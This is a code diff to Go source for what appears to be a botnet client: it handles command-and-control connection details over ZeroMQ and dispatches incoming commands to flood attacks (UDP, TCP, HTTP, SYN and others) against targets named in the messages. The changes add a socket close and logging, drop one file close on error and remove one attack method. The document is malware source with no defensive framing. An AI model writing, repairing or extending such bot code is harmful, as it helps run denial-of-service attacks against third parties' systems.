@@ -253,6 +253,8 @@ func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown
 				if err != nil {
 					log.Fatalln(err)
 					go subhandler(subscriber, C2info.postC2info.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
+				} else {
+					subscriber.Close()
 				}
 			}
 		case postinfo := <-dealmigsignal:
@@ -659,9 +661,6 @@ loop:
 
 					if err != nil {
 						log.Printf("failed to write to file: %v", err)
-						if file != nil {
-							file.Close()
-						}
 						break
 					}
 				}
@@ -708,6 +707,7 @@ loop:
 }
 
 func methodhandler(messages []string) {
+	log.Println(messages)
 	if len(messages) == 5 {
 		switch messages[1] {
 		case "UDP":
@@ -716,8 +716,6 @@ func methodhandler(messages []string) {
 			go attack.TCP(messages[2], messages[3], messages[4])
 		case "HTTP":
 			go attack.HTTP(messages[2], messages[3], messages[4])
-		case "UDPRAPE":
-			go attack.UDPRAPE(messages[2], messages[3], messages[4])
 		case "SYN":
 			go attack.SYN(messages[2], messages[3], messages[4])
 		case "UDP-VIP":
